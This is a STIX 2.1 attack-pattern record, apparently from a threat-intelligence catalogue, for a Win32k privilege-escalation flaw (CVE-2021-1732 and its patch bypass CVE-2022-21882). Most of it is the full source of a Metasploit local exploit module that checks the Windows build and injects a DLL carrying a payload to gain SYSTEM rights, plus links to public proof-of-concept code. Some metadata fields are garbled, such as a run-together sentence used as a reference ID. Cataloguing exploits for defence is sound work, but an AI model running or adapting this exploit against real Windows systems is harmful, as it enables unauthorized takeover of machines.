{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70cb0ebe-3add-4102-992d-97e8ae325d26",
    "created": "2024-08-14T16:49:35.291296Z",
    "modified": "2024-08-14T16:49:35.291299Z",
    "name": "Win32k ConsoleControl Offset Confusion",
    "description": " A vulnerability exists within win32k that can be leveraged by an attacker to escalate privileges to those of NT AUTHORITY\\SYSTEM. The flaw exists in how the WndExtra field of a window can be manipulated into being treated as an offset despite being populated by an attacker-controlled value. This can be leveraged to achieve an out of bounds write operation, eventually leading to privilege escalation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2022_21882_win32k.rb",
            "external_id": "cve_2022_21882_win32k.rb"
        },
        {
            "source_name": "Inearly2022",
            "external_id": "atechniquetobypassthepatchwasidentifiedandassignedCVE-2022-21882.Therootcauseis"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-1732"
        },
        {
            "source_name": "reference",
            "url": "https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/KaLendsi/CVE-2021-1732-Exploit"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/1a332300-7ded-419b-b717-9bf03ca2a14e"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1732"
        },
        {
            "source_name": "reference",
            "url": "https://www.fuzzysecurity.com/tutorials/expDev/22.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.geoffchappell.com/studies/windows/win32/user32/structs/wnd/index.htm"
        },
        {
            "source_name": "reference",
            "url": "https://byteraptors.github.io/windows/exploitation/2020/06/03/exploitingcve2019-1458.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.trendmicro.com/en_us/research/16/l/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-21882"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/L4ys/CVE-2022-21882"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/KaLendsi/CVE-2022-21882"
        },
        {
            "source_name": "DisclosureDate=>2021-02-09",
            "external_id": "#CVE-2021-1732disclosuredate"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  include Msf::Exploit::Deprecated\n  moved_from 'exploit/windows/local/cve_2021_1732_win32k'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Win32k ConsoleControl Offset Confusion',\n          'Description' => %q{\n            A vulnerability exists within win32k that can be leveraged by an attacker to escalate privileges to those of\n            NT AUTHORITY\\SYSTEM. The flaw exists in how the WndExtra field of a window can be manipulated into being\n            treated as an offset despite being populated by an attacker-controlled value. This can be leveraged to\n            achieve an out of bounds write operation, eventually leading to privilege escalation.\n\n            This flaw was originally identified as CVE-2021-1732 and was patched by Microsoft on February 9th, 2021.\n            In early 2022, a technique to bypass the patch was identified and assigned CVE-2022-21882. The root cause is\n            is the same for both vulnerabilities. This exploit combines the patch bypass with the original exploit to\n            function on a wider range of Windows 10 targets.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            # CVE-2021-1732\n            'BITTER APT', # exploit as used in the wild\n            'JinQuan', # detailed analysis\n            'MaDongZe', # detailed analysis\n            'TuXiaoYi', # detailed analysis\n            'LiHao', # detailed analysis\n            # CVE-2022-21882\n            'L4ys', # github poc\n            # both CVEs\n            'KaLendsi', # github pocs\n            # Metasploit exploit\n            'Spencer McIntyre' # metasploit module\n          ],\n          'Arch' => [ ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows 10 v1803-21H2 x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'Payload' => {\n            'DisableNops' => true\n          },\n          'References' => [\n            # CVE-2021-1732 references\n            [ 'CVE', '2021-1732' ],\n            [ 'URL', 'https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/' ],\n            [ 'URL', 'https://github.com/KaLendsi/CVE-2021-1732-Exploit' ],\n            [ 'URL', 'https://attackerkb.com/assessments/1a332300-7ded-419b-b717-9bf03ca2a14e' ],\n            [ 'URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1732' ],\n            # the rest are not cve-2021-1732 specific but are on topic regarding the techniques used within the exploit\n            [ 'URL', 'https://www.fuzzysecurity.com/tutorials/expDev/22.html' ],\n            [ 'URL', 'https://www.geoffchappell.com/studies/windows/win32/user32/structs/wnd/index.htm' ],\n            [ 'URL', 'https://byteraptors.github.io/windows/exploitation/2020/06/03/exploitingcve2019-1458.html' ],\n            [ 'URL', 'https://www.trendmicro.com/en_us/research/16/l/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild.html' ],\n            # CVE-2022-21882 references\n            [ 'CVE', '2022-21882' ],\n            [ 'URL', 'https://github.com/L4ys/CVE-2022-21882' ],\n            [ 'URL', 'https://github.com/KaLendsi/CVE-2022-21882' ]\n          ],\n          'DisclosureDate' => '2021-02-09', # CVE-2021-1732 disclosure date\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [ CRASH_OS_RESTARTS, ],\n            'Reliability' => [ REPEATABLE_SESSION, ],\n            'SideEffects' => []\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return Exploit::CheckCode::Safe\n    end\n\n    version = get_version_info\n    vprint_status(\"Windows Build Number = #{version.product_name}\")\n    if version.build_number.between?(Msf::WindowsVersion::Win10_1803, Msf::WindowsVersion::Win10_21H2)\n      CheckCode::Appears\n    elsif version.build_number == Msf::WindowsVersion::Server2022 || version.build_number == Msf::WindowsVersion::Win11_21H2\n      CheckCode::Detected(\"May be vulnerable, but exploit not tested on #{version.product_name}\")\n    else\n      print_error('Vulnerability only present on Windows 10 versions 1803 - 21H2, Windows 11 21H2, Server 2019 and Server 2022')\n      return CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86\n      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2022-21882', 'CVE-2022-21882.x64.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "win'"
    ]
}